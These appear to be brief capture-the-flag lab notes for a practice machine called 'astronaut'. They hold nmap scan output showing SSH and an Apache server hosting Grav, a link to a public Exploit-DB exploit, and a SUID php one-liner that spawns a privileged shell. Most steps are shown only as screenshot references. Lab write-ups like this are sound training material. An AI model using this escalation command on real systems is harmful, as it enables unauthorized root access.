```
┌──(kali㉿kali)-[~/PG/astronaut]
└─$ nmap -p- --min-rate 10000 192.168.140.12                             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-10 22:01 EST
Nmap scan report for 192.168.140.12
Host is up (0.060s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.28 seconds
                                                                                                                                               
┌──(kali㉿kali)-[~/PG/astronaut]
└─$ nmap -p 22,80 -sCV 192.168.140.12                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-10 22:02 EST
Nmap scan report for 192.168.140.12
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.80 seconds
```

![Pasted image 20250211110433](<0. Attachments/Pasted image 20250211110433.png>)

![Pasted image 20250211110700](<0. Attachments/Pasted image 20250211110700.png>)

![Pasted image 20250211111024](<0. Attachments/Pasted image 20250211111024.png>)

https://www.exploit-db.com/exploits/49973

![Pasted image 20250211113321](<0. Attachments/Pasted image 20250211113321.png>)

![Pasted image 20250211115621](<0. Attachments/Pasted image 20250211115621.png>)

![Pasted image 20250211115714](<0. Attachments/Pasted image 20250211115714.png>)

`/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"`

![Pasted image 20250211115655](<0. Attachments/Pasted image 20250211115655.png>)

